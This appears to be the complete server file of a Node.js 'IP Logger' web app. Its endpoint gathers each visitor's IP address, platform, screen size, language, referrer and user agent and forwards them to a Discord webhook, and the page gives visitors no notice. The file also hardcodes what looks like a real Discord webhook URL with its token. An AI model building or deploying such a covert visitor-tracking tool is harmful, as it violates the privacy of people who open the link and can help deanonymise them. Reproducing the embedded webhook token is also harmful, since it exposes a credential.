// Load environment variables from .env file
require('dotenv').config();

const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// Discord webhook URL - can be overridden with environment variable
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1400505379758149673/lUSTOjk7MinuTvaNm51LrNXeriB3p9XIt7VAKL8ff9hwIcmXcsZ_2OFhJqeeBiYqLBTX';

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Route to serve the main page
app.get('/', (req, res) => {
    // Log IP directly from the request
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`Visitor IP: ${ip}`);
    
    // Send the HTML file
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Endpoint to receive visitor data and forward to Discord
app.post('/log-visitor', async (req, res) => {
    try {
        const visitorData = req.body;
        
        // Get server-side IP as well (more reliable than client-side)
        const serverSideIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        // Use server-side IP if available, otherwise use client-provided IP
        const finalIP = serverSideIP || visitorData.ip;
        visitorData.ip = finalIP;
        
        // Format data for Discord webhook
        const webhookData = {
            embeds: [{
                title: "🔍 New Visitor Detected",
                color: 3447003, // Blue color
                fields: [
                    { name: "📱 IP Address", value: finalIP, inline: true },
                    { name: "🕒 Date & Time", value: new Date().toISOString(), inline: true },
                    { name: "💻 Platform", value: visitorData.platform || "Unknown", inline: true },
                    { name: "🖥️ Screen Size", value: visitorData.screen || "Unknown", inline: true },
                    { name: "🌐 Language", value: visitorData.language || "Unknown", inline: true },
                    { name: "🔗 Referrer", value: visitorData.referrer || "Direct visit", inline: true },
                    { name: "🌍 User Agent", value: visitorData.userAgent || "Unknown" }
                ],
                footer: {
                    text: "IP Logger by NinjaTech AI"
                },
                timestamp: new Date().toISOString()
            }]
        };
        
        // Send to Discord webhook
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookData)
        });
        
        if (!response.ok) {
            throw new Error(`Discord webhook error: ${response.statusText}`);
        }
        
        console.log('Visitor information sent to Discord webhook successfully');
        res.status(200).json({ success: true });
        
    } catch (error) {
        console.error('Error sending to Discord webhook:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Visit http://localhost:${PORT} to view the website`);
});
